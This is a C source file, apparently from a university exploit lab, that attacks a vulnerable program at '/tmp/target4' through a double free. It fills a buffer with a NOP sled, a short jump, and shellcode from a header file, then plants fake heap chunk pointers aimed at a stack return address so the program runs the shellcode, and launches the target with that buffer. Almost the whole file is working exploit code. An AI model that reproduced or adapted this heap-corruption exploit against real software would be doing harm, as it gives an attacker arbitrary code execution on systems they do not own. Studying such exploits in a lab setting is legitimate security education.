#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  // double free

  char instructions[2048];

  // NOP instructions
  memset(instructions, '\x90', 2048);

  strncpy(instructions+2, "\xeb\x04\x75\xf8\xff\xbf", 6);
  // shellcode
  strncpy(instructions+1000-(strlen(shellcode)), shellcode, strlen(shellcode));
  // left pointer of q, pointing to the beginning of the buffer, 0x8059478
  strncpy(instructions+1528, "\x78\x94\x05\x08", 4);
  // right pointer of q, pointing to return address location, 0xbffff674
  strncpy(instructions+1532, "\x7c\xf6\xff\xbf", 4);

  args[0] = TARGET; args[1] = instructions; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
